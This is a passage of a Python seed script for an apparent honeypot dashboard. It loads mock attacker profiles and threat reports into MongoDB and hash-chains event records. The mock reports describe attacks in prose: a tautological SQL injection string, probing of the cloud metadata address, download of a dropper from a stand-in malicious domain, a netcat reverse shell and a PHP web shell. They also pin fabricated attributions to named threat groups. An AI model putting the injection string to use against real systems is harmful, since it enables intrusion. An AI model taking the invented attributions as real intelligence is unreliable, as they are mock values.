        "known_actor_notes": "Lazarus Group affiliate deploying unauthorized Redis cronjob XMRig cryptominers"
    },
    {
        "attacker_id": "ACTOR-K8S-BREACHER",
        "source_ips": ["185.193.88.21"],
        "session_ids": ["ATK-K8S-505"],
        "total_events": 6,
        "first_seen": t(80),
        "last_seen": t(10),
        "max_risk_score": 85,
        "fingerprints": ["K8S-SECRETS-PROBE-APT"],
        "primary_tactics": ["Discovery", "Privilege Escalation", "Lateral Movement"],
        "associated_services": ["kubernetes"],
        "country": "Switzerland",
        "threat_level": "CRITICAL",
        "known_actor_notes": "Specialized cloud-native threat actor probing Kubernetes service account secrets"
    },
    {
        "attacker_id": "ACTOR-RDP-BRUTE-03",
        "source_ips": ["91.240.118.172"],
        "session_ids": ["ATK-RDP-108"],
        "total_events": 5,
        "first_seen": t(300),
        "last_seen": t(80),
        "max_risk_score": 75,
        "fingerprints": ["RDP-BRUTE-HONEYTOKEN-E5"],
        "primary_tactics": ["Credential Access", "Lateral Movement"],
        "associated_services": ["rdp"],
        "country": "Russia",
        "threat_level": "HIGH",
        "known_actor_notes": "RDP credential brute force and Mimikatz operator"
    },
    {
        "attacker_id": "ACTOR-MIRAI-BOTNET",
        "source_ips": ["103.152.220.44"],
        "session_ids": ["ATK-TELNET-301"],
        "total_events": 4,
        "first_seen": t(240),
        "last_seen": t(210),
        "max_risk_score": 45,
        "fingerprints": ["TELNET-MIRAI-SCAN-B1"],
        "primary_tactics": ["Initial Access", "Execution"],
        "associated_services": ["telnet"],
        "country": "Vietnam",
        "threat_level": "MEDIUM",
        "known_actor_notes": "Mirai botnet automated scanner targeting unhardened IoT telnet interfaces"
    }
]

# --------------------------------------------------------------------------
# 6. THREAT REPORTS
# --------------------------------------------------------------------------
MOCK_REPORTS = [
    {
        "report_id": "RPT-ATK-SSH-901",
        "session_id": "ATK-SSH-901",
        "generated_at": now.isoformat(),
        "source_ip": "185.220.101.5",
        "target_ip": "192.168.1.20",
        "service": "ssh",
        "executive_summary": "High-severity intrusion detected on SSH Honeypot. Adversary from 185.220.101.5 bypassed initial decoy authentication, triggered canary honeytoken '/root/.env', accessed Cloud IAM metadata, transferred ingress dropper script, and attempted an interactive reverse shell before automated isolation.",
        "containment_status": {
            "status": "CONTAINED",
            "action": "ISOLATE",
            "reason": "Automated high-risk threshold (95/100) exceeded.",
            "timestamp": t(14)
        },
        "attacker_fingerprint": "SSH-CRED-RECON-DECOY-C3",
        "risk": {
            "score": 95,
            "level": "CRITICAL",
            "breakdown": [
                "Brute-force SSH password guessing (+15)",
                "Authentication bypass with decoy honeytoken (+25)",
                "System & OS reconnaissance executed (+20)",
                "Cloud IAM metadata token exfiltration (+25)",
                "Malicious ingress tool download attempted (+20)",
                "Reverse shell interactive payload (+15)"
            ]
        },
        "mitre_mapping": [m for m in MOCK_MITRE if m["session_id"] == "ATK-SSH-901"],
        "iocs": [i for i in MOCK_IOCS if "ATK-SSH-901" in i.get("session_ids", [])],
        "timeline": [e for e in MOCK_EVENTS if e["session_id"] == "ATK-SSH-901"],
        "ai_analysis": {
            "threat_summary": "Sophisticated nation-state / APT actor (suspected APT29 Cozy Bear) operating via high-anonymity Tor routing. Executed disciplined kill chain from initial credential spraying to post-exploitation cloud credential harvesting and persistence.",
            "likely_objective": "Establish persistent C2 footprint, harvest AWS cloud credentials, escalate privileges, and pivot into enterprise cloud infrastructure.",
            "risk_explanation": "Critical risk verified by multi-stage indicators including OS enumeration, Cloud IAM token access attempt, ingress dropper download, and Netcat reverse shell invocation.",
            "observed_behavior": [
                "Targeted SSH authentication service with dictionary credentials.",
                "Accessed canary honeytoken file '/root/.env' containing fake AWS secrets.",
                "Probed AWS Cloud Instance Metadata Service (169.254.169.254).",
                "Downloaded external payload 'dropper.sh' from malicious distribution domain.",
                "Initiated interactive reverse shell targeting TCP port 9001."
            ],
            "ai_interpretation": [
                "Behavioral markers and command velocity strongly indicate interactive human operator rather than purely automated script.",
                "Adversary intended to use stolen AWS credentials to pivot to cloud control plane."
            ],
            "recommended_actions": [
                "Enforce immediate edge firewall DROP rule for IP 185.220.101.5.",
                "Sinkhole malicious domain 'cdn.malicious-domain.cc' at corporate DNS resolvers.",
                "Verify AWS CloudTrail for any access attempts using the canary IAM keys from /root/.env.",
                "Retain cryptographic SHA-256 blockchain proof block for legal & compliance audit."
            ]
        }
    },
    {
        "report_id": "RPT-ATK-WEB-402",
        "session_id": "ATK-WEB-402",
        "generated_at": now.isoformat(),
        "source_ip": "45.154.255.89",
        "target_ip": "192.168.1.10",
        "service": "http",
        "executive_summary": "Critical web attack campaign identified against HTTP decoy interface. Attacker executed classic SQL injection bypass, accessed canary passwords.txt, downloaded a PHP backdoor web shell, and conducted internal subnet sweeps.",
        "containment_status": {
            "status": "ACTIVE"
        },
        "attacker_fingerprint": "HTTP-SQLI-DECOY-UPLOAD-F8",
        "risk": {
            "score": 90,
            "level": "CRITICAL",
            "breakdown": [
                "Directory fuzzing & sensitive file probes (+20)",
                "Honeytoken passwords.txt accessed (+25)",
                "SQL Injection payload in authentication endpoint (+25)",
                "Web shell dropper download via curl (+20)"
            ]
        },
        "mitre_mapping": [m for m in MOCK_MITRE if m["session_id"] == "ATK-WEB-402"],
        "iocs": [i for i in MOCK_IOCS if "ATK-WEB-402" in i.get("session_ids", [])],
        "timeline": [e for e in MOCK_EVENTS if e["session_id"] == "ATK-WEB-402"],
        "ai_analysis": {
            "threat_summary": "E-Commerce exploitation campaign attributed to FIN7 affiliate. Probed public web endpoints, exploited SQL injection flaw, and staged backdoor web shell.",
            "likely_objective": "Arbitrary code execution on web application server and lateral expansion across internal subnet.",
            "risk_explanation": "Critical volume of actionable indicators including web shell upload, SQL injection strings, and lateral subnet exploration.",
            "observed_behavior": [
                "Scanned robots.txt and grabbed canary file passwords.txt.",
                "Injected tautological SQL strings (' OR '1'='1' --) and UNION SELECT queries.",
                "Downloaded PHP backdoor web shell via curl and spawned Python reverse connection.",
                "Conducted SYN subnet sweep across internal IP range."
            ],
            "ai_interpretation": [
                "Attack follows classic initial access to lateral movement playbook.",
                "High confidence in automated toolchain (sqlmap + custom python dropper)."
            ],
            "recommended_actions": [
                "Deploy WAF signature blocking tautological SQL patterns.",
                "Isolate compromised web worker container immediately.",
                "Add 45.154.255.89 to perimeter blocklist."
            ]
        }
    }
]


async def seed():
    print(f"Connecting to MongoDB: {DB_NAME}...")
    client = AsyncIOMotorClient(MONGODB_URI)
    db = client[DB_NAME]

    print("Cleaning existing mock collections...")
    await db.attack_sessions.delete_many({})
    await db.events.delete_many({})
    await db.iocs.delete_many({})
    await db.mitre_mappings.delete_many({})
    await db.attackers.delete_many({})
    await db.threat_reports.delete_many({})
    await db.blockchain_evidence.delete_many({})

    print(f"Inserting {len(MOCK_SESSIONS)} Attack Sessions...")
    await db.attack_sessions.insert_many(MOCK_SESSIONS)

    print(f"Inserting {len(MOCK_EVENTS)} Honeypot Events...")
    await db.events.insert_many(MOCK_EVENTS)

    print(f"Inserting {len(MOCK_IOCS)} Indicators of Compromise (IOCs)...")
    await db.iocs.insert_many(MOCK_IOCS)

    print(f"Inserting {len(MOCK_MITRE)} MITRE ATT&CK Mappings...")
    await db.mitre_mappings.insert_many(MOCK_MITRE)

    print(f"Inserting {len(MOCK_ATTACKERS)} Attacker Profiles...")
    await db.attackers.insert_many(MOCK_ATTACKERS)

    print(f"Inserting {len(MOCK_REPORTS)} Threat Intelligence Reports...")
    await db.threat_reports.insert_many(MOCK_REPORTS)

    # ----------------------------------------------------------------------
    # Cryptographically chain and seed Blockchain Evidence Blocks
    # ----------------------------------------------------------------------
    print(f"Generating and chaining {len(MOCK_EVENTS)} Blockchain Evidence Blocks...")
    blockchain_blocks = []
    prev_hash = "0" * 64

    for idx, ev in enumerate(MOCK_EVENTS, start=1):
        canonical_data = {
            "event_id": str(ev.get("event_id", "")),
            "session_id": str(ev.get("session_id", "")),
            "source_ip": str(ev.get("source_ip", "")),
            "target_ip": str(ev.get("target_ip", "")),
            "service": str(ev.get("service", "")),
            "timestamp": str(ev.get("timestamp", "")),
            "event_type": str(ev.get("event_type", "")),
            "event": str(ev.get("event", "")),
            "metadata": ev.get("metadata", {})
        }
        canonical_bytes = json.dumps(canonical_data, sort_keys=True, separators=(",", ":")).encode("utf-8")
        event_hash = hashlib.sha256(canonical_bytes).hexdigest()
        evidence_id = f"EVT-{str(idx).zfill(4)}"
        timestamp = ev.get("timestamp") or now.isoformat()
        
        block_payload = f"{idx}|{timestamp}|{evidence_id}|{ev['event_id']}|{event_hash}|{prev_hash}"
        block_hash = hashlib.sha256(block_payload.encode("utf-8")).hexdigest()

        block_doc = {
            "block_index": idx,
            "evidence_id": evidence_id,
            "event_id": ev["event_id"],
            "session_id": ev["session_id"],
            "timestamp": timestamp,
            "event_hash": event_hash,
            "previous_hash": prev_hash,
            "block_hash": block_hash,
            "verified": True,
            "integrity_status": "VERIFIED"
        }
        blockchain_blocks.append(block_doc)
        prev_hash = block_hash

    await db.blockchain_evidence.insert_many(blockchain_blocks)

    print("\n=======================================================")
    print("Database permanently seeded successfully with:")
    print(f"  - Sessions:   {await db.attack_sessions.count_documents({})}")
    print(f"  - Events:     {await db.events.count_documents({})}")
    print(f"  - IOCs:       {await db.iocs.count_documents({})}")
    print(f"  - MITRE:      {await db.mitre_mappings.count_documents({})}")
    print(f"  - Attackers:  {await db.attackers.count_documents({})}")
    print(f"  - Reports:    {await db.threat_reports.count_documents({})}")
    print(f"  - Blockchain: {await db.blockchain_evidence.count_documents({})} Blocks")
    print("=======================================================")

if __name__ == "__main__":
    asyncio.run(seed())
